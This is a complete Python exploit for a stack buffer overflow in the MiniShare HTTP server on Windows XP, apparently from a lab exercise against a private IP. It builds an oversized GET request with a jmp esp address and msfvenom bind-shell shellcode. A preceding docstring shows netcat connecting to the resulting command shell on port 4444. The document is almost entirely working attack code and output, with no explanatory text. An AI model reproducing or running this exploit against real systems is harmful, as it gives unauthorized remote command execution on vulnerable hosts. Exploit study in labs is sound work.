'''
root@kali:~# nc -v 192.168.61.148 4444
192.168.61.148: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.61.148] 4444 (?) open
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\MiniShare>dir
'''
import socket, struct

# Shellcode generated with msfvenom:
# msfvenom -p windows/shell_bind_tcp -a x86 -b '\x00\x0d' -f python
shellcode =  ""
shellcode += "\xbe\x47\x33\xc6\x3e\xdb\xc1\xd9\x74\x24\xf4\x58\x29"
shellcode += "\xc9\xb1\x53\x31\x70\x12\x03\x70\x12\x83\xaf\xcf\x24"
shellcode += "\xcb\xd3\xd8\x2b\x34\x2b\x19\x4c\xbc\xce\x28\x4c\xda"
shellcode += "\x9b\x1b\x7c\xa8\xc9\x97\xf7\xfc\xf9\x2c\x75\x29\x0e"
shellcode += "\x84\x30\x0f\x21\x15\x68\x73\x20\x95\x73\xa0\x82\xa4"
shellcode += "\xbb\xb5\xc3\xe1\xa6\x34\x91\xba\xad\xeb\x05\xce\xf8"
shellcode += "\x37\xae\x9c\xed\x3f\x53\x54\x0f\x11\xc2\xee\x56\xb1"
shellcode += "\xe5\x23\xe3\xf8\xfd\x20\xce\xb3\x76\x92\xa4\x45\x5e"
shellcode += "\xea\x45\xe9\x9f\xc2\xb7\xf3\xd8\xe5\x27\x86\x10\x16"
shellcode += "\xd5\x91\xe7\x64\x01\x17\xf3\xcf\xc2\x8f\xdf\xee\x07"
shellcode += "\x49\x94\xfd\xec\x1d\xf2\xe1\xf3\xf2\x89\x1e\x7f\xf5"
shellcode += "\x5d\x97\x3b\xd2\x79\xf3\x98\x7b\xd8\x59\x4e\x83\x3a"
shellcode += "\x02\x2f\x21\x31\xaf\x24\x58\x18\xb8\x89\x51\xa2\x38"
shellcode += "\x86\xe2\xd1\x0a\x09\x59\x7d\x27\xc2\x47\x7a\x48\xf9"
shellcode += "\x30\x14\xb7\x02\x41\x3d\x7c\x56\x11\x55\x55\xd7\xfa"
shellcode += "\xa5\x5a\x02\x96\xad\xfd\xfd\x85\x50\xbd\xad\x09\xfa"
shellcode += "\x56\xa4\x85\x25\x46\xc7\x4f\x4e\xef\x3a\x70\x61\xac"
shellcode += "\xb3\x96\xeb\x5c\x92\x01\x83\x9e\xc1\x99\x34\xe0\x23"
shellcode += "\xb2\xd2\xa9\x25\x05\xdd\x29\x60\x21\x49\xa2\x67\xf5"
shellcode += "\x68\xb5\xad\x5d\xfd\x22\x3b\x0c\x4c\xd2\x3c\x05\x26"
shellcode += "\x77\xae\xc2\xb6\xfe\xd3\x5c\xe1\x57\x25\x95\x67\x4a"
shellcode += "\x1c\x0f\x95\x97\xf8\x68\x1d\x4c\x39\x76\x9c\x01\x05"
shellcode += "\x5c\x8e\xdf\x86\xd8\xfa\x8f\xd0\xb6\x54\x76\x8b\x78"
shellcode += "\x0e\x20\x60\xd3\xc6\xb5\x4a\xe4\x90\xb9\x86\x92\x7c"
shellcode += "\x0b\x7f\xe3\x83\xa4\x17\xe3\xfc\xd8\x87\x0c\xd7\x58"
shellcode += "\xb7\x46\x75\xc8\x50\x0f\xec\x48\x3d\xb0\xdb\x8f\x38"
shellcode += "\x33\xe9\x6f\xbf\x2b\x98\x6a\xfb\xeb\x71\x07\x94\x99"
shellcode += "\x75\xb4\x95\x8b"

buf = "GET "
buf += "A" * 1787
buf += struct.pack("<L", 0x7e429353)    # 0x7e429353 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
buf += "\x90" * 20                      # padding before shellcode
buf += shellcode
buf += " HTTP/1.1\r\n\r\n"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.61.148',80))
s.send(buf)
s.close()
